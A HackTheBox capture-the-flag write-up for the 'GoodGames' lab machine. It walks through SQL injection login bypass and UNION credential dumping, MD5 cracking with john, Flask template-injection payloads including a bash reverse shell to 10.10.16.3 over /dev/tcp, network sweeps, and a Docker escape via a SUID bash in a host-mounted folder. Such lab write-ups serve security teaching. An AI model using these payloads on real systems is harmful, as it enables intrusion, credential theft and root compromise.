---
title: HackTheBox - GoodGames
author:
  name: wonderchild
  link: https://twitter.com/vonderchild
date: 2022-04-05 4:40:00 +0000
categories: [HTB]
tags: [HTB, boot2root]
---

# Reconnaissance

```bash
**nmap -sC -sV goodgames.htb**

PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack Apache httpd 2.4.51
|_http-favicon: Unknown favicon MD5: 61352127DC66484D3736CACCF50E7BEB
| http-methods: 
|_  Supported Methods: HEAD OPTIONS GET POST
|_http-title: GoodGames | Community and Store
|_http-server-header: Werkzeug/2.0.2 Python/3.9.2
```

### Port 80

![](/assets/img/htb/Untitled.png)

# Exploitation

### SQL Injection in email parameter

```sql
' or 1=1-- -&password=randompass
```

![Login Success](/assets/img/htb/Untitled%201.png)

Login Success

```sql
'' union select 1,2,3,database()-- -&password=admin
'' union select 1,2,3,table_name from information_schema.tables-- where table_schema="main" -&password=admin
'' union select 1,2,3,column_name from information_schema.columns where table_name='user'-- -&password=admin
'' union select 1,2,3,concat(email,':',password) from user-- -&password=admin
```

![admin@goodgames.htb:2b22337f218b2d82dfc3b6f77e7cb8ec](/assets/img/htb/Untitled%202.png)

admin@goodgames.htb:2b22337f218b2d82dfc3b6f77e7cb8ec

```bash
**john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=RAW-MD5**

Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
superadministrator (?)     
1g 0:00:00:00 DONE (2022-03-20 01:31) 2.083g/s 7242Kp/s 7242Kc/s 7242KC/s superarely1993..super5dooper
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```

Logging in using the credentials reveals another vhost on the top-right corner.

[http://internal-administration.goodgames.htb](http://internal-administration.goodgames.htb/)

The new subdomain is running a flask template. We can login using the username admin and password we found before.

Let’s try out SSTI in the Full Name parameter.

![Untitled](/assets/img/htb/Untitled%203.png)

![It’s vulnerable to Server Side Template Injection.](/assets/img/htb/Untitled%204.png)

It’s vulnerable to Server Side Template Injection.

Let’s now try to get a reverse shell.

```bash
{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('bash shell.sh').read() }}

OR

{{ namespace.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/10.10.16.3/4444 0>&1"').read() }}
```

```bash
**pwncat :4444**

[01:39:31] Welcome to pwncat 🐈!                                                                                                                                                   __main__.py:153
[01:41:12] received connection from 10.10.11.130:36922                                                                                                                                  bind.py:76
[01:41:16] 10.10.11.130:36922: registered new host w/ db                                                                                                                            manager.py:504
(local) pwncat$

(remote) root@3a453ab39d3d:/home/augustus# cat user.txt 
f2b90e0ce653b03eef5f40362ce1c070
```

# Privilege Escalation

```bash
(remote) root@3a453ab39d3d:/backend# df -h
Filesystem      Size  Used Avail Use% Mounted on
overlay         6.3G  4.5G  1.5G  76% /
tmpfs            64M     0   64M   0% /dev
tmpfs           2.0G     0  2.0G   0% /sys/fs/cgroup
/dev/sda1       6.3G  4.5G  1.5G  76% /home/augustus
shm              64M     0   64M   0% /dev/shm
tmpfs           2.0G     0  2.0G   0% /proc/acpi
tmpfs           2.0G     0  2.0G   0% /sys/firmware
```

Interestingly, this shows that the /home/augustus directory is mounted into docker.

Let’s do a ping sweep to check how many hosts are up

```bash
$ **for i in {1..254}; do (ping -c 1 172.19.0.${i} | grep "bytes from" | grep -v "Unreachable" &); done;**
64 bytes from 172.19.0.1: icmp_seq=1 ttl=64 time=0.109 ms
64 bytes from 172.19.0.2: icmp_seq=1 ttl=64 time=0.051 ms
```

172.19.0.1 is up and is probably working as a gateway. Let’s do a port scan of the host.

```bash
$ **for port in {1..65535}; do echo > /dev/tcp/172.19.0.1/$port && echo "$port open"; done 2>/dev/null**
22 open
80 open
```

We can login to ssh using the password we found before.

We know that the /home/augustus directory is mounted between docker and the host machine. And since we have the root user in docker, perhaps we can change the suid bit of a binary using root user inside docker and then elevate privileges by executing that binary on the host machine.

```bash
(remote) root@3a453ab39d3d:/home/augustus# chown root:root bash 
(remote) root@3a453ab39d3d:/home/augustus# chmod +s bash 
(remote) root@3a453ab39d3d:/home/augustus# ssh augustus@172.19.0.1
augustus@172.19.0.1's password: 
Linux GoodGames 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Mar 20 08:08:07 2022 from 172.19.0.2
augustus@GoodGames:~$ ./bash -p
bash-5.1# cat /root/root.txt
abc1d9629fcf8f74bf5273a206baba2c
```

And voila! It works!